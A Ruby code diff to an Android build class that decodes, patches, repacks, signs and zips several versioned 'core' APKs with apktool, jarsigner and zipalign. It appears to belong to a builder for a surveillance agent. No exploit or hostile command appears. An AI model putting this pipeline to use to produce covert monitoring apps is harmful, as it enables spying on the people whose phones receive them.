@@ -21,14 +21,18 @@ class BuildAndroid < Build
     trace :debug, "Build: apktool extract: #{@tmpdir}/apk"
 
     apktool = path('apktool.jar')
-    core = path('core')
+    Dir[path('core.*.apk')].each do |d| 
+      trace :debug, "unpack: #{d}" 
+      version = d.scan(/core.android.(.*).apk/).flatten.first		
+      trace :debug, "version: #{version}"
 
-    CrossPlatform.exec "java", "-jar #{apktool} d #{core} #{@tmpdir}/apk"
-
-    if File.exist?(path('apk/res/raw/resources.bin'))
-      @outputs << ['apk/res/raw/resources.bin', 'apk/res/raw/config.bin']
-    else
-      raise "unpack failed. needed file not found"
+      CrossPlatform.exec "java", "-jar #{apktool} d #{d} #{@tmpdir}/apk.#{version}"
+      
+      if File.exist?(path("apk.#{version}/res/raw/resources.bin"))
+        @outputs << ["apk.#{version}/res/raw/resources.bin", "apk.#{version}/res/raw/config.bin"]
+      else
+        raise "unpack failed. needed file not found"
+      end
     end
   end
 
@@ -36,17 +40,23 @@ class BuildAndroid < Build
 
     trace :debug, "Build: patching: #{params}"
 
-    # add the file to be patched to the params
-    # these params will be passed to the super
-    params[:core] = 'apk/res/raw/resources.bin'
-    params[:config] = 'apk/res/raw/config.bin'
-
     # enforce demo flag accordingly to the license
     # or raise if cannot build
     params['demo'] = LicenseManager.instance.can_build_platform :android, params['demo']
+      
+    Dir[path('core.*.apk')].each do |d| 
+      trace :debug, "patch: #{d}" 
+      version = d.scan(/core.android.(.*).apk/).flatten.first		
+      trace :debug, "version: #{version}"
+      
+      # add the file to be patched to the params
+      # these params will be passed to the super
+      params[:core] = "apk.#{version}/res/raw/resources.bin"
+      params[:config] = "apk.#{version}/res/raw/config.bin"
 
-    # invoke the generic patch method with the new params
-    super
+      # invoke the generic patch method with the new params
+      super
+    end
 
   end
 
@@ -56,18 +66,24 @@ class BuildAndroid < Build
     @appname = params['appname'] || 'install'
 
     apktool = path('apktool.jar')
-    apk = path('output.apk')
-
-    File.chmod(0755, path('aapt')) if File.exist? path('aapt')
-
-    CrossPlatform.exec "java", 
-                       "-jar #{apktool} b #{@tmpdir}/apk #{apk}",
-                       {add_path: @tmpdir}
+   	File.chmod(0755, path('aapt')) if File.exist? path('aapt')
+    @outputs = []
     
-    if File.exist?(apk)
-      @outputs = ['output.apk']
-    else
-      raise "pack failed."
+    Dir[path('core.*.apk')].each do |d| 
+      trace :debug, "melt: #{d}" 
+      version = d.scan(/core.android.(.*).apk/).flatten.first
+      trace :debug, "version: #{version}"
+      apk = path("output.#{version}.apk")
+
+      CrossPlatform.exec "java", 
+                         "-jar #{apktool} b #{@tmpdir}/apk.#{version} #{apk}",
+                         {add_path: @tmpdir}
+      
+      if File.exist?(apk)
+        @outputs << "output.#{version}.apk"
+      else
+        raise "pack failed."
+      end
     end
 
   end
@@ -75,28 +91,40 @@ class BuildAndroid < Build
   def sign(params)
     trace :debug, "Build: signing with #{Config::CERT_DIR}/android.keystore"
 
-    apk = path(@outputs.first)
-    core = path(@appname + '.apk')
+    apks = @outputs
+    @outputs = []
+    apks.each do |d| 
+      trace :debug, "sign: #{d}" 
+      version = d.scan(/output.(.*).apk/).flatten.first	
+      trace :debug, "version: #{version}"
+      
+      apk = path(d)
+      output="#{@appname}.#{version}.apk"
+      core = path(output)
 
-    raise "Cannot find keystore" unless File.exist? Config.instance.cert('android.keystore')
+      raise "Cannot find keystore" unless File.exist? Config.instance.cert('android.keystore')
 
-    CrossPlatform.exec "jarsigner", "-keystore #{Config.instance.cert('android.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -keypass #{Config.instance.global['CERT_PASSWORD']} #{apk} ServiceCore"
+      CrossPlatform.exec "jarsigner", "-keystore #{Config.instance.cert('android.keystore')} -storepass #{Config.instance.global['CERT_PASSWORD']} -keypass #{Config.instance.global['CERT_PASSWORD']} #{apk} ServiceCore"
 
-    raise "jarsigner failed" unless File.exist? apk
-    
-    File.chmod(0755, path('zipalign')) if File.exist? path('zipalign')
-    CrossPlatform.exec path('zipalign'), "-f 4 #{apk} #{core}" or raise("cannot align apk")
+      raise "jarsigner failed" unless File.exist? apk
+      
+      File.chmod(0755, path('zipalign')) if File.exist? path('zipalign')
+      CrossPlatform.exec path('zipalign'), "-f 4 #{apk} #{core}" or raise("cannot align apk")
 
-    FileUtils.rm_rf(apk)
+      FileUtils.rm_rf(apk)
 
-    @outputs = [@appname + '.apk']
+      @outputs << output
+    end
   end
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
 
     Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-      z.file.open(@appname + '.apk', "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
+      @outputs.each do |o|
+        trace :debug, "adding: #{o}" 
+        z.file.open(o, "wb") { |f| f.write File.open(path(o), 'rb') {|f| f.read} }
+      end
     end
 
     # this is the only file we need to output after this point
